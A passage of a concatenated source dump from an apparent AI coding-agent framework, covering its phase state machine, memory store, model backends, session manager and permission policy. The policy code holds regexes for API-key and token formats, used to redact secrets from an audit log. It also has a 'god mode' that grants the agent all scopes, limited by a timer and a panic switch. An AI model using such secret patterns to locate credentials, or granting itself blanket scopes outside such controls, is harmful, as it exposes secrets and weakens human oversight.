        if not result.success:
            return None

        if current in _PHASE_ORDER:
            idx = _PHASE_ORDER.index(current)
            if idx + 1 < len(_PHASE_ORDER):
                return _PHASE_ORDER[idx + 1]

        raise InvalidTransition(current, Phase.HALTED)

    @staticmethod
    def _is_terminal(phase: Phase) -> bool:
        return phase in (Phase.HALTED, Phase.COMPLETED)

```

## `core/kernel/state.py`

```python
# core/kernel/state.py — Phase enum, transition rules, and session state

import time
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path
from typing import Any, Dict, Optional


class Phase(Enum):
    """Phases of the kernel state machine."""
    INTAKE = auto()
    CONTRACT = auto()
    REPO_MAP = auto()
    PLAN = auto()
    RETRIEVE = auto()
    PATCH = auto()
    CRITIQUE = auto()
    RUN = auto()
    FIX = auto()
    FINALIZE = auto()
    HALTED = auto()
    COMPLETED = auto()


# Allowed transitions: current phase -> set of valid next phases
TRANSITIONS: Dict[Phase, frozenset] = {
    Phase.INTAKE:    frozenset({Phase.CONTRACT, Phase.HALTED}),
    Phase.CONTRACT:  frozenset({Phase.REPO_MAP, Phase.HALTED}),
    Phase.REPO_MAP:  frozenset({Phase.PLAN, Phase.HALTED}),
    Phase.PLAN:      frozenset({Phase.RETRIEVE, Phase.HALTED}),
    Phase.RETRIEVE:  frozenset({Phase.PATCH, Phase.HALTED}),
    Phase.PATCH:     frozenset({Phase.CRITIQUE, Phase.HALTED}),
    Phase.CRITIQUE:  frozenset({Phase.RUN, Phase.HALTED}),
    Phase.RUN:       frozenset({Phase.FIX, Phase.FINALIZE, Phase.HALTED}),
    Phase.FIX:       frozenset({Phase.PATCH, Phase.HALTED}),
    Phase.FINALIZE:  frozenset({Phase.COMPLETED, Phase.HALTED}),
    Phase.HALTED:    frozenset(),
    Phase.COMPLETED: frozenset(),
}


class InvalidTransition(Exception):
    """Raised when a phase transition violates state machine rules."""

    def __init__(self, from_phase: Phase, to_phase: Phase):
        self.from_phase = from_phase
        self.to_phase = to_phase
        super().__init__(f"Invalid transition: {from_phase.name} -> {to_phase.name}")


def validate_transition(from_phase: Phase, to_phase: Phase) -> None:
    """Raise InvalidTransition if from_phase -> to_phase is not allowed."""
    allowed = TRANSITIONS.get(from_phase, frozenset())
    if to_phase not in allowed:
        raise InvalidTransition(from_phase, to_phase)


@dataclass
class SessionState:
    """Mutable state for a single kernel session (one --task invocation)."""

    task_description: str
    current_phase: Phase = Phase.INTAKE
    total_iterations: int = 0
    phase_retries: Dict[Phase, int] = field(default_factory=dict)
    phase_start_time: Optional[float] = None
    session_start_time: float = field(default_factory=time.monotonic)
    halt_reason: Optional[str] = None
    artifacts: Dict[str, Any] = field(default_factory=dict)
    session_id: Optional[str] = None
    session_dir: Optional[Path] = None

    def enter_phase(self, phase: Phase) -> None:
        """Transition to a new phase. Validates, increments iterations, resets timer."""
        validate_transition(self.current_phase, phase)
        self.current_phase = phase
        self.phase_start_time = time.monotonic()
        self.total_iterations += 1

    def record_phase_retry(self, phase: Phase) -> int:
        """Increment retry count for a phase. Returns new count."""
        current = self.phase_retries.get(phase, 0)
        self.phase_retries[phase] = current + 1
        return current + 1

    def halt(self, reason: str) -> None:
        """Move to HALTED terminal state."""
        self.current_phase = Phase.HALTED
        self.halt_reason = reason

    def complete(self) -> None:
        """Move to COMPLETED terminal state."""
        validate_transition(self.current_phase, Phase.COMPLETED)
        self.current_phase = Phase.COMPLETED

```

## `core/kv_prefix.py`

```python
# core/kv_prefix.py — KV-cacheable static prefix builder

from typing import Callable, Dict, List, Optional

from pydantic import BaseModel


def build_static_prefix(
    system_message: str,
    tool_names: List[str],
    describe_tool_fn: Callable[[str], Dict],
    policy: Optional[BaseModel] = None,
) -> str:
    """Build the invariant prefix shared across Planner->Coder->Reviewer handoffs.

    Composition: System Prompt + Tool Schemas + Policy summary.
    This prefix is identical for every turn in a session, making it
    KV-cacheable by providers that support prefix caching.
    """
    parts = [system_message]

    # Tool schemas
    if tool_names:
        tool_lines = []
        for name in sorted(tool_names):
            desc = describe_tool_fn(name)
            tool_lines.append(f"- {name}: {desc.get('description', 'No description')}")
        parts.append(
            "Available tools:\n" + "\n".join(tool_lines)
        )

    # Policy summary
    if policy is not None:
        policy_data = policy.model_dump()
        policy_lines = []
        for key, value in sorted(policy_data.items()):
            if value:  # skip empty lists, empty strings, etc.
                policy_lines.append(f"  {key}: {value}")
        if policy_lines:
            parts.append(
                "Session policy:\n" + "\n".join(policy_lines)
            )

    return "\n\n".join(parts)

```

## `core/memory/__init__.py`

```python
from core.memory.memory import UnifiedMemory
```

## `core/memory/memory.py`

```python
# core/memory/memory.py
# UnifiedMemory: Manages short-term and long-term memory using SQLite and FAISS.

import sqlite3, json, time, hashlib
from pathlib import Path
from typing import Optional, List, Dict
import numpy as np
import faiss
from openai import OpenAI

# ---- Helpers ----
def now() -> int:
    return int(time.time())

def normalize(vec: np.ndarray) -> np.ndarray:
    vec = vec.astype("float32")
    norm = np.linalg.norm(vec)
    return vec / (norm + 1e-8)

# ---- UnifiedMemory ----
class UnifiedMemory:
    def __init__(self, db_path: Path, model="text-embedding-3-large", debug=False, embedding_client=None):
        """db_path: SQLite file, model: embedding model (default: 3-large)."""
        self.debug = debug
        self.db_path = Path(db_path)
        if self.debug: print(f"db_path: {self.db_path}")
        self.model = model
        if self.debug: print(f"model: {self.model}")
        self.client = embedding_client if embedding_client is not None else OpenAI()

        # FAISS indexes
        self.long_index = None
        self.rag_index = None
        self.long_id_map: List[int] = []
        self.rag_id_map: List[int] = []

        # Ensure DB and schema

        self._ensure_db()

        self._rebuild_indexes()

    # ----- Schema -----
    def _ensure_db(self):
        with sqlite3.connect(self.db_path) as con:
            con.executescript("""
            PRAGMA journal_mode=WAL;
            CREATE TABLE IF NOT EXISTS meta(
                k TEXT PRIMARY KEY,
                v TEXT
            );
            CREATE TABLE IF NOT EXISTS short_term(
                id INTEGER PRIMARY KEY,
                role TEXT, content TEXT, ts INTEGER
            );
            CREATE TABLE IF NOT EXISTS long_term(
                id INTEGER PRIMARY KEY,
                role TEXT, content TEXT,
                embedding BLOB, meta TEXT, ts INTEGER
            );
            CREATE TABLE IF NOT EXISTS rag_chunks(
                id INTEGER PRIMARY KEY,
                dir TEXT, file TEXT, chunk_index INT,
                content TEXT, embedding BLOB,
                sha TEXT, ts INTEGER
            );
            CREATE TABLE IF NOT EXISTS adventures(
                id INTEGER PRIMARY KEY,
                prompt TEXT, code TEXT, result TEXT,
                mode TEXT, success INT, ts INTEGER
            );
            """)
        # model lock on first use
        self._ensure_model_lock()

    def _ensure_model_lock(self):
        with sqlite3.connect(self.db_path) as con:
            cur = con.execute("SELECT v FROM meta WHERE k='embedding_model'")
            row = cur.fetchone()
            if row is None:
                con.execute("INSERT INTO meta(k, v) VALUES('embedding_model', ?)", (self.model,))
            else:
                saved = row[0]
                if saved != self.model:
                    raise RuntimeError(
                        f"Embedding model mismatch.\n"
                        f"DB locked to: {saved}\n"
                        f"Requested:   {self.model}\n"
                        f"Choose the same model or run a migration (re-embed)."
                    )

    # ----- Connection Helper -----
    def _connect(self):
        """Helper to open SQLite connection consistently."""
        return sqlite3.connect(self.db_path)


    # ----- Embedding -----
    def _embed(self, text: str) -> np.ndarray:
        """Embed a text string safely (hard-cut to avoid token overflows)."""
        text = text[:8000]  # defensive cap; chunking should keep us below this anyway
        resp = self.client.embeddings.create(input=text, model=self.model)
        return np.array(resp.data[0].embedding, dtype=np.float32)

    # ----- Short Term -----
    def add_short(self, role: str, content: str):
        with sqlite3.connect(self.db_path) as con:
            con.execute("INSERT INTO short_term(role,content,ts) VALUES(?,?,?)",
                        (role, content, now()))

    def load_short(self, n=20) -> List[Dict]:
        with sqlite3.connect(self.db_path) as con:
            rows = con.execute(
                "SELECT role,content FROM short_term ORDER BY id DESC LIMIT ?",
                (n,)
            ).fetchall()
        return [{"role": r, "content": c} for r, c in reversed(rows)]

    def reset_short(self):
        with sqlite3.connect(self.db_path) as con:
            con.execute("DELETE FROM short_term")

    # ----- Long Term -----
    def add_long(self, role: str, content: str, meta: Optional[dict] = None):
        emb = normalize(self._embed(content))
        with sqlite3.connect(self.db_path) as con:
            cur = con.execute(
                "INSERT INTO long_term(role,content,embedding,meta,ts) VALUES(?,?,?,?,?)",
                (role, content, emb.tobytes(), json.dumps(meta or {}), now())
            )
            rid = cur.lastrowid
        # Update FAISS
        if self.long_index is None:
            self.long_index = faiss.IndexFlatIP(len(emb))
        self.long_index.add(emb.reshape(1, -1))
        self.long_id_map.append(rid)

    def search_long(self, query: str, top_k=3) -> List[Dict]:
        if self.long_index is None:
            return []
        q = normalize(self._embed(query))
        D, I = self.long_index.search(q.reshape(1, -1), top_k)
        results = []
        with sqlite3.connect(self.db_path) as con:
            for idx in I[0]:
                if idx < 0 or idx >= len(self.long_id_map):
                    continue
                rid = self.long_id_map[idx]
                row = con.execute(
                    "SELECT role,content FROM long_term WHERE id=?",
                    (rid,)
                ).fetchone()
                if row:
                    results.append({"role": row[0], "content": row[1]})
        return results

    def purge_long(self):
        with sqlite3.connect(self.db_path) as con:
            con.execute("DELETE FROM long_term")
        self.long_index = None
        self.long_id_map = []

    # ----- RAG helpers -----
    @staticmethod
    def _hash_file(path: Path) -> str:
        return hashlib.sha256(path.read_bytes()).hexdigest()

    # ----- RAG: search / manage -----
    def search_rag(self, query: str, top_k=6, dir_filter: Optional[str] = None):
        """Semantic search over RAG chunks, returning content + source metadata."""
        if self.rag_index is None:
            return []

        q = normalize(self._embed(query))
        D, I = self.rag_index.search(q.reshape(1, -1), top_k)

        dir_root = None
        if dir_filter:
            dir_root = str(Path(dir_filter).expanduser().resolve())

        results = []
        with sqlite3.connect(self.db_path) as con:
            for idx, score in zip(I[0], D[0]):
                if idx < 0 or idx >= len(self.rag_id_map):
                    continue
                cid = self.rag_id_map[idx]
                row = con.execute(
                    "SELECT dir,file,chunk_index,content FROM rag_chunks WHERE id=?",
                    (cid,)
                ).fetchone()
                if not row:
                    continue
                d, f, chunk, content = row
                f_abs = str(Path(f).resolve())
                if dir_root and not f_abs.startswith(dir_root + "/") and f_abs != dir_root:
                    continue
                results.append({
                    "dir": d,
                    "file": f_abs,
                    "chunk": chunk,
                    "content": content,
                    "score": float(score)
                })
        # sort by score (cosine similarity)
        results.sort(key=lambda r: r["score"], reverse=True)
        return results

    def delete_rag(self, target: Path):
        """Delete all chunks from a given file or directory and rebuild FAISS."""
        target = Path(target).expanduser().resolve()
        with sqlite3.connect(self.db_path) as con:
            if target.is_file():
                con.execute("DELETE FROM rag_chunks WHERE file=?", (str(target),))
            else:
                con.execute("DELETE FROM rag_chunks WHERE dir=?", (str(target),))
        self._rebuild_rag_index()

    def overwrite_rag(self, target: Path):
        """Delete existing RAG entries for target, then re-crawl."""
        self.delete_rag(target)
        if target.is_file():
            return self.crawl_file(target)
        else:
            return self.crawl_dir(target)

    def rag_status(self):
        """Return a summary of RAG contents: directories, files, and chunk counts."""
        with sqlite3.connect(self.db_path) as con:
            rows = con.execute("""
                SELECT dir, file, COUNT(*) as chunks
                FROM rag_chunks
                GROUP BY dir, file
                ORDER BY dir, file
            """).fetchall()
        status: Dict[str, List[Dict]] = {}
        for d, f, c in rows:
            status.setdefault(d, []).append({"file": f, "chunks": c})
        return status

    # ----- Index Rebuild -----
    def _rebuild_indexes(self):
        self._rebuild_long_index()
        self._rebuild_rag_index()

    def _rebuild_long_index(self):
        with sqlite3.connect(self.db_path) as con:
            rows = con.execute("SELECT id,embedding FROM long_term").fetchall()
        if not rows:
            self.long_index = None
            self.long_id_map = []
            return
        dim = len(np.frombuffer(rows[0][1], dtype=np.float32))
        self.long_index = faiss.IndexFlatIP(dim)
        self.long_id_map = []
        vecs = []
        for rid, eblob in rows:
            v = normalize(np.frombuffer(eblob, dtype=np.float32))
            vecs.append(v)
            self.long_id_map.append(rid)
        self.long_index.add(np.stack(vecs))

    def _rebuild_rag_index(self):
        with sqlite3.connect(self.db_path) as con:
            rows = con.execute("SELECT id,embedding FROM rag_chunks").fetchall()
        if not rows:
            self.rag_index = None
            self.rag_id_map = []
            return
        dim = len(np.frombuffer(rows[0][1], dtype=np.float32))
        self.rag_index = faiss.IndexFlatIP(dim)
        self.rag_id_map = []
        vecs = []
        for rid, eblob in rows:
            v = normalize(np.frombuffer(eblob, dtype=np.float32))
            vecs.append(v)
            self.rag_id_map.append(rid)
        self.rag_index.add(np.stack(vecs))

    # ----- Adventures -----
    def add_adventure(self, prompt: str, code: str, result: str, mode: str, success: bool):
        """Insert a coding adventure into the adventures table."""
        with sqlite3.connect(self.db_path) as con:
            con.execute(
                "INSERT INTO adventures(prompt,code,result,mode,success,ts) VALUES(?,?,?,?,?,?)",
                (prompt, code, result, mode, int(success), now())
            )

    def list_adventures(self, n: int = 10) -> List[Dict]:
        """Return the last N adventures in chronological order (oldest first)."""
        with sqlite3.connect(self.db_path) as con:
            rows = con.execute(
                "SELECT prompt,code,result,mode,success,ts FROM adventures ORDER BY id DESC LIMIT ?",
                (n,)
            ).fetchall()
        # reverse so oldest → newest
        return [
            {
                "prompt": r[0],
                "code": r[1],
                "result": r[2],
                "mode": r[3],
                "success": bool(r[4]),
                "ts": r[5],
            }
            for r in reversed(rows)
        ]




```

## `core/policy/__init__.py`

```python
# core/policy/__init__.py — Policy package exports

from core.contracts.schemas import ProfileMode, GodModeGrant, AuditEntry
from core.policy.profiles import PROFILE_SCOPES, policy_for_profile
from core.policy.audit import AuditLogger
from core.policy.god_mode import GodModeSession

__all__ = [
    "ProfileMode",
    "GodModeGrant",
    "AuditEntry",
    "PROFILE_SCOPES",
    "policy_for_profile",
    "AuditLogger",
    "GodModeSession",
]

```

## `core/policy/audit.py`

```python
# core/policy/audit.py — Append-only JSONL audit logger with secret redaction

import json
import re
from pathlib import Path
from typing import List, Optional

from core.contracts.schemas import AuditEntry


class AuditLogger:
    """Append-only JSONL audit logger.

    Default path: ``~/.judais_lobi_audit.jsonl``

    All entries are redacted for secrets before writing.
    """

    SECRET_PATTERNS = [
        re.compile(r'(sk-[a-zA-Z0-9]{20,})'),                    # OpenAI keys
        re.compile(r'(ghp_[a-zA-Z0-9]{36,})'),                    # GitHub PATs
        re.compile(r'(AKIA[A-Z0-9]{16})'),                        # AWS access keys
        re.compile(r'(xox[bpsar]-[a-zA-Z0-9-]+)'),               # Slack tokens
    ]

    def __init__(self, path: Optional[Path] = None):
        self._path = Path(path) if path else Path.home() / ".judais_lobi_audit.jsonl"

    @property
    def path(self) -> Path:
        return self._path

    def log(self, entry: AuditEntry) -> None:
        """Append an audit entry to the JSONL file.

        Secrets in the ``detail`` field are redacted before writing.
        """
        data = entry.model_dump()
        data["detail"] = self._redact(data.get("detail", ""))
        data["timestamp"] = data["timestamp"].isoformat()
        with open(self._path, "a", encoding="utf-8") as f:
            f.write(json.dumps(data, default=str) + "\n")

    def tail(self, n: int = 20) -> List[dict]:
        """Read the last *n* entries from the audit log."""
        if not self._path.exists():
            return []
        lines = self._path.read_text(encoding="utf-8").strip().splitlines()
        entries = []
        for line in lines[-n:]:
            try:
                entries.append(json.loads(line))
            except json.JSONDecodeError:
                continue
        return entries

    def _redact(self, text: str) -> str:
        """Replace known secret patterns with [REDACTED]."""
        for pattern in self.SECRET_PATTERNS:
            text = pattern.sub("[REDACTED]", text)
        return text

```

## `core/policy/god_mode.py`

```python
# core/policy/god_mode.py — God mode with TTL + panic switch

import threading
from typing import Optional

from core.contracts.schemas import AuditEntry, GodModeGrant, ProfileMode
from core.policy.audit import AuditLogger
from core.tools.capability import CapabilityEngine


class GodModeSession:
    """Manages god mode activation with mandatory reason, TTL, and panic switch.

    - ``activate()`` sets profile to GOD, starts a TTL timer
    - ``panic()`` immediately downgrades to SAFE and revokes all grants
    - TTL expiry auto-downgrades to DEV
    """

    def __init__(self, audit: AuditLogger):
        self._audit = audit
        self._grant: Optional[GodModeGrant] = None
        self._panic = threading.Event()
        self._timer: Optional[threading.Timer] = None

    @property
    def grant(self) -> Optional[GodModeGrant]:
        return self._grant

    def is_active(self) -> bool:
        """True if god mode is currently active and not expired/panicked."""
        if self._grant is None:
            return False
        if self._grant.panic_revoked:
            return False
        if self._panic.is_set():
            return False
        # Check if timer is still alive (not expired)
        if self._timer is not None and not self._timer.is_alive():
            return False
        return True

    def activate(
        self,
        reason: str,
        ttl: float = 300.0,
        capability_engine: Optional[CapabilityEngine] = None,
    ) -> GodModeGrant:
        """Activate god mode.

        Parameters
        ----------
        reason : str
            Mandatory reason for activation (audit trail).
        ttl : float
            Time-to-live in seconds. After expiry, auto-downgrades to DEV.
        capability_engine : CapabilityEngine, optional
            If provided, profile is set to GOD immediately.
        """
        # Cancel any existing timer
        if self._timer is not None:
            self._timer.cancel()

        self._panic.clear()
        self._grant = GodModeGrant(reason=reason, ttl_seconds=ttl)

        if capability_engine is not None:
            capability_engine.set_profile(ProfileMode.GOD)

        self._timer = threading.Timer(
            ttl, self._auto_downgrade, args=[capability_engine],
        )
        self._timer.daemon = True
        self._timer.start()

        self._audit.log(AuditEntry(
            event_type="god_activate",
            detail=reason,
            profile="god",
            verdict="allowed",
        ))
        return self._grant

    def panic(self, capability_engine: Optional[CapabilityEngine] = None) -> None:
        """Immediate kill switch.

        - Sets panic event (checked by ToolBus before every dispatch)
        - Cancels TTL timer
        - Marks grant as panic_revoked
        - Downgrades to SAFE and revokes all grants
        """
        self._panic.set()

        if self._timer is not None:
            self._timer.cancel()

        if self._grant is not None:
            self._grant.panic_revoked = True

        if capability_engine is not None:
            capability_engine.set_profile(ProfileMode.SAFE)
            capability_engine.revoke_all_grants()

        self._audit.log(AuditEntry(
            event_type="panic",
            profile="safe",
            verdict="panic_revoked",
        ))

    @property
    def is_panicked(self) -> bool:
        """True if the panic switch has been activated."""
        return self._panic.is_set()

    def _auto_downgrade(self, capability_engine: Optional[CapabilityEngine] = None) -> None:
        """Called by timer when TTL expires. Downgrades to DEV."""
        if self._panic.is_set():
            return  # Already panicked, don't override

        if capability_engine is not None:
            capability_engine.set_profile(ProfileMode.DEV)

        self._audit.log(AuditEntry(
            event_type="god_expire",
            profile="dev",
            verdict="allowed",
        ))

```

## `core/policy/profiles.py`

```python
# core/policy/profiles.py — Profile → PolicyPack mapping

from typing import Dict, List

from core.contracts.schemas import PolicyPack, ProfileMode


# Each profile level defines *additional* scopes beyond the previous level.
# policy_for_profile() accumulates scopes up to the requested level.
PROFILE_SCOPES: Dict[ProfileMode, List[str]] = {
    ProfileMode.SAFE: [
        "fs.read",
        "git.read",
        "verify.run",
    ],
    ProfileMode.DEV: [
        "fs.write",
        "git.write",
        "python.exec",
        "shell.exec",
    ],
    ProfileMode.OPS: [
        "git.push",
        "git.fetch",
        "pip.install",
        "http.read",
        "fs.delete",
        "audio.output",
    ],
    ProfileMode.GOD: ["*"],
}


def policy_for_profile(profile: ProfileMode) -> PolicyPack:
    """Build a PolicyPack with accumulated scopes up to *profile* level.

    Each level includes all scopes from lower levels.  GOD adds the
    wildcard ``"*"`` which the CapabilityEngine interprets as allow-all.
    """
    scopes: List[str] = []
    for level in ProfileMode:
        scopes.extend(PROFILE_SCOPES[level])
        if level == profile:
            break
    return PolicyPack(allowed_scopes=sorted(set(scopes)))

```

## `core/runtime/__init__.py`

```python
# core/runtime/__init__.py

from core.runtime.backends import (
    Backend,
    BackendCapabilities,
    OpenAIBackend,
    MistralBackend,
    LocalBackend,
)
from core.runtime.messages import build_system_prompt, build_chat_context
from core.runtime.provider_config import DEFAULT_MODELS, resolve_provider

__all__ = [
    "Backend",
    "BackendCapabilities",
    "OpenAIBackend",
    "MistralBackend",
    "LocalBackend",
    "build_system_prompt",
    "build_chat_context",
    "DEFAULT_MODELS",
    "resolve_provider",
]

```

## `core/runtime/backends/__init__.py`

```python
# core/runtime/backends/__init__.py

from core.runtime.backends.base import Backend, BackendCapabilities
from core.runtime.backends.openai_backend import OpenAIBackend
from core.runtime.backends.mistral_backend import MistralBackend
from core.runtime.backends.local_backend import LocalBackend

__all__ = [
    "Backend",
    "BackendCapabilities",
    "OpenAIBackend",
    "MistralBackend",
    "LocalBackend",
]

```

## `core/runtime/backends/base.py`

```python
# core/runtime/backends/base.py — Backend ABC + capabilities dataclass

from abc import ABC, abstractmethod
from dataclasses import dataclass
from typing import Dict, List


@dataclass(frozen=True)
class BackendCapabilities:
    supports_streaming: bool = True
    supports_json_mode: bool = False
    supports_tool_calls: bool = False


class Backend(ABC):
    @property
    @abstractmethod
    def capabilities(self) -> BackendCapabilities: ...

    @abstractmethod
    def chat(self, model: str, messages: List[Dict], stream: bool = False):
        """Returns str (non-streaming) or iterator of SimpleNamespace (streaming)."""
        ...

```

## `core/runtime/backends/local_backend.py`

```python
# core/runtime/backends/local_backend.py — Stub for Phase 8

from typing import Dict, List

from core.runtime.backends.base import Backend, BackendCapabilities


class LocalBackend(Backend):
    def __init__(self, endpoint: str = "http://localhost:8000"):
        self.endpoint = endpoint

    def chat(self, model: str, messages: List[Dict], stream: bool = False):
        raise NotImplementedError(
            "Local inference not yet implemented. See Phase 8."
        )

    @property
    def capabilities(self) -> BackendCapabilities:
        return BackendCapabilities(
            supports_streaming=False,
            supports_json_mode=False,
            supports_tool_calls=False,
        )

```

## `core/runtime/backends/mistral_backend.py`

```python
# core/runtime/backends/mistral_backend.py — Mistral cURL/SSE wrapper

import json
import os
import subprocess
import tempfile
from types import SimpleNamespace
from typing import Dict, List

from core.runtime.backends.base import Backend, BackendCapabilities


class MistralBackend(Backend):
    def __init__(self):
        self.api_key = os.getenv("MISTRAL_API_KEY")
        if not self.api_key:
            raise RuntimeError("Missing MISTRAL_API_KEY")

    def chat(self, model: str, messages: List[Dict], stream: bool = False):
        if not model:
            model = "codestral-latest"

        payload = {"model": model, "messages": messages, "stream": stream}

        with tempfile.NamedTemporaryFile("w+", delete=False) as tmp:
            json.dump(payload, tmp)
            tmp.flush()
            tmp_path = tmp.name

        cmd = [
            "curl",
            "-s",
            "https://api.mistral.ai/v1/chat/completions",
            "-H", f"Authorization: Bearer {self.api_key}",
            "-H", "Content-Type: application/json",
            "-d", f"@{tmp_path}",
        ]

        if not stream:
            res = subprocess.run(cmd, capture_output=True, text=True)
            os.unlink(tmp_path)
            try:
                parsed = json.loads(res.stdout)
                return parsed["choices"][0]["message"]["content"]
            except Exception:
                return res.stdout.strip()

        # --- Streaming mode ---
        def mistral_stream():
            with subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            ) as proc:
                for line in proc.stdout:
                    line = line.strip()
                    if not line or not line.startswith("data: "):
                        continue
                    data = line[len("data: "):]
                    if data == "[DONE]":
                        break
                    try:
                        obj = json.loads(data)
                        content = obj["choices"][0]["delta"].get("content")
                        if content:
                            yield SimpleNamespace(
                                choices=[
                                    SimpleNamespace(
                                        delta=SimpleNamespace(content=content)
                                    )
                                ]
                            )
                    except Exception:
                        continue
            os.unlink(tmp_path)

        return mistral_stream()

    @property
    def capabilities(self) -> BackendCapabilities:
        return BackendCapabilities(
            supports_streaming=True,
            supports_json_mode=True,
            supports_tool_calls=False,
        )

```

## `core/runtime/backends/openai_backend.py`

```python
# core/runtime/backends/openai_backend.py — OpenAI SDK wrapper

import os
from typing import Dict, List

from openai import OpenAI

from core.runtime.backends.base import Backend, BackendCapabilities


class OpenAIBackend(Backend):
    def __init__(self, openai_client=None):
        if openai_client is not None:
            self.client = openai_client
        else:
            key = os.getenv("OPENAI_API_KEY")
            if not key:
                raise RuntimeError("Missing OPENAI_API_KEY")
            self.client = OpenAI(api_key=key)

    def chat(self, model: str, messages: List[Dict], stream: bool = False):
        if stream:
            return self.client.chat.completions.create(
                model=model, messages=messages, stream=True
            )
        result = self.client.chat.completions.create(model=model, messages=messages)
        return result.choices[0].message.content

    @property
    def capabilities(self) -> BackendCapabilities:
        return BackendCapabilities(
            supports_streaming=True,
            supports_json_mode=True,
            supports_tool_calls=True,
        )

```

## `core/runtime/messages.py`

```python
# core/runtime/messages.py — System prompt and chat context assembly

from typing import Callable, Dict, List, Optional


def build_system_prompt(
    system_message: str,
    tool_names: List[str],
    describe_tool_fn: Callable[[str], Dict],
    examples: List,
) -> str:
    """Assemble system prompt from message, tool descriptions, and examples."""
    tool_info = "\n".join(
        f"- {name}: {describe_tool_fn(name)['description']}"
        for name in tool_names
    )
    examples_text = "\n\n".join(
        f"User: {ex[0]}\nAssistant: {ex[1]}" for ex in examples
    )
    return (
        f"{system_message}\n\n"
        "You have the following tools (do not call them directly):\n"
        f"{tool_info}\n\n"
        "Tool results appear in history as assistant messages; treat them as your own work.\n\n"
        f"Here are examples:\n\n{examples_text}"
    )


def build_chat_context(
    system_prompt: str,
    history: List[Dict[str, str]],
    invoked_tools: Optional[List[str]] = None,
) -> List[Dict[str, str]]:
    """Build the message list sent to the backend.

    Replaces history[0] (system message) with the full system_prompt,
    appends tool-context annotation if invoked_tools is provided.
    """
    prompt = system_prompt
    if invoked_tools:
        prompt += (
            "\n\n[Tool Context] "
            f"{', '.join(invoked_tools)} results are available above.\n"
        )
    return [{"role": "system", "content": prompt}] + history[1:]

```

## `core/runtime/provider_config.py`

```python
# core/runtime/provider_config.py — Provider defaults and resolution

import os
from typing import Optional

DEFAULT_MODELS = {
    "openai": "gpt-4o-mini",
    "mistral": "codestral-latest",
}


def resolve_provider(
    requested: Optional[str] = None,
    has_injected_client: bool = False,
) -> str:
    """Resolve provider: explicit arg > ELF_PROVIDER env > default 'openai'.

    When no client is injected, falls back between providers if the
    requested one's API key is missing.
    """
    from rich import print  # local to avoid hard dep when not needed

    prov = (requested or os.getenv("ELF_PROVIDER") or "openai").strip().lower()

    if not has_injected_client:
        openai_key = (os.getenv("OPENAI_API_KEY") or "").strip()
        mistral_key = (os.getenv("MISTRAL_API_KEY") or "").strip()

        if prov == "openai" and not openai_key:
            print("[yellow]Warning: No OpenAI key found - falling back to Mistral.[/yellow]")
            prov = "mistral"
        elif prov == "mistral" and not mistral_key:
            print("[yellow]Warning: No Mistral key found - falling back to OpenAI.[/yellow]")
            prov = "openai"

    return prov

```

## `core/sessions/__init__.py`

```python
# core/sessions/__init__.py — Re-exports SessionManager

from core.sessions.manager import SessionManager

__all__ = ["SessionManager"]

```

## `core/sessions/manager.py`

```python
# core/sessions/manager.py — Session artifact persistence

import json
import shutil
import uuid
from pathlib import Path
from typing import List, Optional

from pydantic import BaseModel


class SessionManager:
    """Manages session artifacts on disk.

    Directory layout:
        sessions/<session_id>/
            artifacts/
                000_INTAKE_task_contract.json
                001_CONTRACT_task_contract.json
                ...
            checkpoints/
                pre_PATCH_001/artifacts/
            grants/grant_000.json
            memory_pins/pin_000.json
    """

    def __init__(self, base_dir: Path, session_id: Optional[str] = None):
        self._base_dir = Path(base_dir)
        self._session_id = session_id or uuid.uuid4().hex[:12]
        self._session_dir = self._base_dir / "sessions" / self._session_id
        self._artifacts_dir = self._session_dir / "artifacts"
        self._checkpoints_dir = self._session_dir / "checkpoints"
        self._grants_dir = self._session_dir / "grants"
        self._memory_pins_dir = self._session_dir / "memory_pins"

        # Create directories
        for d in (self._artifacts_dir, self._checkpoints_dir,
                  self._grants_dir, self._memory_pins_dir):
            d.mkdir(parents=True, exist_ok=True)

    @property
    def session_id(self) -> str:
        return self._session_id

    @property
    def session_dir(self) -> Path:
        return self._session_dir

    # ------------------------------------------------------------------
    # Artifacts
    # ------------------------------------------------------------------

    def write_artifact(self, phase_name: str, sequence: int, artifact: BaseModel) -> Path:
        """Write a phase artifact to disk. Returns the written file path."""
        schema_name = type(artifact).__name__
        filename = f"{sequence:03d}_{phase_name}_{schema_name}.json"
        path = self._artifacts_dir / filename
        path.write_text(artifact.model_dump_json(indent=2))
        return path

    def load_latest_artifact(self, phase_name: str) -> Optional[dict]:
        """Load the latest artifact for a given phase name, or None."""
        matches = sorted(self._artifacts_dir.glob(f"*_{phase_name}_*.json"))
        if not matches:
            return None
        return json.loads(matches[-1].read_text())

    def load_all_artifacts(self) -> List[dict]:
        """Load all artifacts in sequence order."""
        files = sorted(self._artifacts_dir.glob("*.json"))
        return [json.loads(f.read_text()) for f in files]

    # ------------------------------------------------------------------
    # Checkpoints
    # ------------------------------------------------------------------

    def checkpoint(self, label: str) -> Path:
        """Snapshot current artifacts directory under the given label."""
        checkpoint_dir = self._checkpoints_dir / label / "artifacts"
        if checkpoint_dir.exists():
            shutil.rmtree(checkpoint_dir)
        shutil.copytree(self._artifacts_dir, checkpoint_dir)
        return checkpoint_dir.parent

    def rollback(self, label: str) -> None:
        """Restore artifacts from a checkpoint, replacing current artifacts."""
        checkpoint_dir = self._checkpoints_dir / label / "artifacts"
        if not checkpoint_dir.exists():
            raise FileNotFoundError(f"Checkpoint '{label}' not found")
        shutil.rmtree(self._artifacts_dir)
        shutil.copytree(checkpoint_dir, self._artifacts_dir)

    # ------------------------------------------------------------------
    # Grants
    # ------------------------------------------------------------------

    def write_grant(self, grant: BaseModel) -> Path:
        """Write a permission grant to disk."""
        existing = sorted(self._grants_dir.glob("grant_*.json"))
        seq = len(existing)
        filename = f"grant_{seq:03d}.json"
        path = self._grants_dir / filename
        path.write_text(grant.model_dump_json(indent=2))
        return path

    def load_grants(self) -> List[dict]:
        """Load all grants from disk in sequence order."""
        files = sorted(self._grants_dir.glob("grant_*.json"))
        return [json.loads(f.read_text()) for f in files]

    # ------------------------------------------------------------------
    # Tool traces (Phase 4)
    # ------------------------------------------------------------------

    def write_tool_trace(self, trace: BaseModel) -> Path:
        """Write a tool trace to disk for audit."""
        traces_dir = self._session_dir / "tool_traces"
        traces_dir.mkdir(parents=True, exist_ok=True)
        existing = sorted(traces_dir.glob("trace_*.json"))
        seq = len(existing)
        filename = f"trace_{seq:03d}.json"
        path = traces_dir / filename
